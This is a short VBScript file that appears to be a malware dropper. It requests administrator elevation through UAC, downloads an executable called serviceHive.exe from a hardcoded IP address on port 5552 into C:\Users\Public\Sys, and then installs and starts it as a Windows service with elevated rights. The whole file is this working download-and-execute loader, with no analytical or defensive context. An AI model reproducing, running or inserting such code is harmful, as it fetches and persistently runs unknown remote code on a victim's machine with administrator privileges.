' Check if script is running as admin
If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    WScript.Quit
End If

' Now running as admin, proceed with the script
Dim url, downloadPath, objXMLHTTP, objStream, objShell, objFSO, objFile, installResult, startResult
Dim commandOutput, errorFile

url = "http://207.174.26.23:5552/uploads/serviceHive.exe"
downloadPath = "C:\Users\Public\Sys\serviceHive.exe"
errorFile = "C:\Users\Public\Sys\serviceHives_log.txt"

' Ensure the directory exists
Set objFSO = CreateObject("Scripting.FileSystemObject")
If Not objFSO.FolderExists("C:\Users\Public\Sys\") Then
    objFSO.CreateFolder("C:\Users\Public\Sys\")
End If

' Download the file
Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
objXMLHTTP.Open "GET", url, False
objXMLHTTP.Send

If objXMLHTTP.Status = 200 Then
    ' Create a stream object to handle binary data
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 ' Binary data
    objStream.Open
    objStream.Write objXMLHTTP.ResponseBody
    objStream.SaveToFile downloadPath, 2 ' Save as a file and overwrite if exists
    objStream.Close
    WScript.Sleep 1000

Else
    WScript.Sleep 1000
    WScript.Quit
End If

' Verify the file exists before running commands
If objFSO.FileExists(downloadPath) Then
    Set objShell = CreateObject("Shell.Application")
    
    ' Install the service
    WScript.Sleep 1000
    installResult = objShell.ShellExecute(downloadPath, "install", "", "runas", 1)
     WScript.Sleep 10000


    startResult = objShell.ShellExecute(downloadPath, "start", "", "runas", 1)
     WScript.Sleep 1000
Else
     WScript.Sleep 1000
End If
